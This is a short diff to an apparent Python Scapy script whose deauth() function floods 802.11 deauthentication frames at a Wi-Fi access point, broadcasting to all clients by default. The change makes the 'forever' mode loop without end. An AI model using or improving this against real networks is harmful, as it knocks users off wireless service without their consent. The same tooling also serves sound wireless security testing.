@@ -1,4 +1,3 @@
-
 from scapy.all import *
 from scapy import *
 
@@ -9,4 +8,4 @@ def deauth(interface, bssid_addr, destination_addr = 'ff:ff:ff:ff:ff:ff', foreve
     if not forever:
         sendp(pkt, iface=interface, inter=0.1, count=2000, verbose=1)
     else:
-        sendp(pkt, iface=interface, inter=0.1, count=0, verbose=1)
+        sendp(pkt, iface=interface, inter=0.1, loop=True, verbose=1)
